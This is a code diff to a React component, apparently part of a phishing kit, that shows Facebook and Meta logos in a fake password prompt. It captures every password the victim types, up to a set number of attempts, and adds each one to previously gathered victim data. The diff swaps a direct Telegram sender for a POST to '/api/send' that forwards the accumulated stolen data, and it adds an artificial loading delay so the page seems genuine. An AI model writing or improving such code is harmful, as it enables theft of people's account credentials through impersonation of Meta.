@@ -2,11 +2,11 @@ import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import sendMessage from '@/utils/telegram';
 import translateText from '@/utils/translate';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import axios from 'axios';
 import Image from 'next/image';
 import { type FC, useEffect, useState } from 'react';
 
@@ -18,7 +18,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId } = store();
+    const { geoInfo, messageId, messageContent, setMessageContent } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -56,9 +56,18 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const message = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
+        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
+
+        const updatedMessage = messageContent ? `${messageContent}\n\n${passwordLine}` : passwordLine;
+
         try {
-            await sendMessage(message, messageId ?? undefined);
+            await axios.post('/api/send', {
+                message: updatedMessage,
+                message_id: messageId
+            });
+
+            setMessageContent(updatedMessage);
+
             if (config.PASSWORD_LOADING_TIME) {
                 await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
             }
